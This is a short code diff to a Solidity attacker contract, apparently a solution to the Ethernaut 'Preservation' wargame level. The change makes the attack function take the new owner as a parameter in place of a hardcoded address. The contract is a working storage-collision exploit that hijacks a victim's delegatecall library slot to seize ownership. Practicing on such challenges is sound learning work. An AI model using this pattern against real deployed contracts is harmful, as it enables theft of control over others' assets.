@@ -13,12 +13,12 @@ contract N16PreservationAttacker {
         victim = Preservation(targetAddr);
     }
 
-    function attack() external {
+    function attack(address newOwner) external {
         //update victim's index zero to malicious contract's address
         victim.setFirstTime(uint256(uint160(address(this))));
 
         //set the new owner for victim contract
-        victim.setFirstTime(uint256(uint160(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266)));
+        victim.setFirstTime(uint256(uint160(newOwner)));
     }
 
     function setTime(uint256 timeStampInAirquotes) external {
